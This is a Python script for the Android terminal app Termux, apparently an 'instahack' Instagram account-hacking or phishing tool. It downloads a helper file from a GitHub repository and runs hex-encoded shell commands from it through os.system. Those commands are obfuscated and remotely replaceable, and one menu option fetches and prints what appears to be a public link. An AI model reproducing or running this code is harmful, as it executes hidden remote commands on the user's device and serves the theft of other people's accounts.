try:
    import os
    import time
    import sys
    import requests

except:
    os.system("pip install requests")
    import os
    import time
    import sys
    import requests

if os.path.isdir("/data/data/com.termux/files/home/instahack"):
    os.chdir("/data/data/com.termux/files/home/instahack/")
    if os.path.isdir("utils"):
        if os.path.isfile("utils/lines.py"):
            pass

        else:
            os.system("curl -LO https://raw.githubusercontent.com/Ak-Tools/Private/main/lines.py")
            os.system("mv lines.py utils/")
    else:
        os.system("mkdir utils")
        os.system("curl -LO https://raw.githubusercontent.com/Ak-Tools/Private/main/lines.py")
        os.system("mv lines.py utils")
else:
    os.system("mkdir $HOME/instahack")
    os.chdir("/data/data/com.termux/files/home/instahack/")
    if os.path.isdir("utils"):
        if os.path.isfile("utils/lines.py"):
            pass

        else:
            os.system("curl -LO https://raw.githubusercontent.com/Ak-Tools/Private/main/lines.py")
            os.system("mv lines.py utils/")
    else:
        os.system("mkdir utils")
        os.system("curl -LO https://raw.githubusercontent.com/Ak-Tools/Private/main/lines.py")
        os.system("mv lines.py utils")

import utils.lines as ut

def progress(process, speed):
    process = bytes.fromhex(process).decode('utf-8')
    for i in process:
        print (i, end="")
        sys.stdout.flush()
        time.sleep(speed)

os.system(bytes.fromhex(ut.line3).decode('utf-8'))
print (bytes.fromhex(ut.line4).decode('utf-8'))
os.system(bytes.fromhex(ut.line5).decode('utf-8'))
if os.path.isfile(bytes.fromhex(ut.line30).decode('utf-8')):
    pass

else:
    os.system(bytes.fromhex(ut.line6).decode('utf-8'))
    os.system(bytes.fromhex(ut.line7).decode('utf-8'))
    os.system(bytes.fromhex(ut.line8).decode('utf-8'))
    os.system(bytes.fromhex(ut.line15).decode('utf-8'))

while True:
    os.system(bytes.fromhex(ut.line3).decode('utf-8'))
    print (bytes.fromhex(ut.line9).decode('utf-8') + "\n\n" + bytes.fromhex(ut.line10).decode('utf-8') + "\n" + bytes.fromhex(ut.line11).decode('utf-8') + "\n" + bytes.fromhex(ut.line17).decode('utf-8'))
    enter = input("\n" + bytes.fromhex(ut.line12).decode('utf-8'))

    if enter == "1":
        os.system(bytes.fromhex(ut.line25).decode('utf-8'))
        os.system(bytes.fromhex(ut.line3).decode('utf-8'))
        print (bytes.fromhex(ut.line13).decode('utf-8'))
        os.system(bytes.fromhex(ut.line20).decode('utf-8'))
        time.sleep(10)
        os.chdir(bytes.fromhex(ut.line1).decode('utf-8'))
        os.system(bytes.fromhex(ut.line2).decode('utf-8'))
        re = requests.get(bytes.fromhex(ut.line19).decode('utf-8'))
        re = str(re.content)
        re = re.replace(",", "\n")
        re = re.split()
        for i in re:
            if bytes.fromhex(ut.line21).decode('utf-8') in i:
                i = i.replace(bytes.fromhex(ut.line21).decode('utf-8'), "")
                ne = i.replace('"', "")

        ne = ne.replace(bytes.fromhex(ut.line26).decode('utf-8'), "")
        ne = ne.replace(bytes.fromhex(ut.line27).decode('utf-8'), "")
        os.system(bytes.fromhex(ut.line3).decode('utf-8'))
        print (bytes.fromhex(ut.line22).decode('utf-8') + ne)
        enter = input("\n" + bytes.fromhex(ut.line23).decode('utf-8'))
        break

    elif enter == "2":
        os.system(bytes.fromhex(ut.line3).decode('utf-8'))
        os.system(bytes.fromhex(ut.line11).decode('utf-8'))
        os.system(bytes.fromhex(ut.line15).decode('utf-8'))
        break

    elif enter == "3":
        os.system(bytes.fromhex(ut.line3).decode('utf-8'))
        print (bytes.fromhex(ut.line18).decode('utf-8'))

    else:
        print ("\n" + bytes.fromhex(ut.line14).decode('utf-8'))
        time.sleep(1)

os.system(bytes.fromhex(ut.line3).decode('utf-8'))
progress(ut.line28, 0.1)
progress(ut.line29, 5)
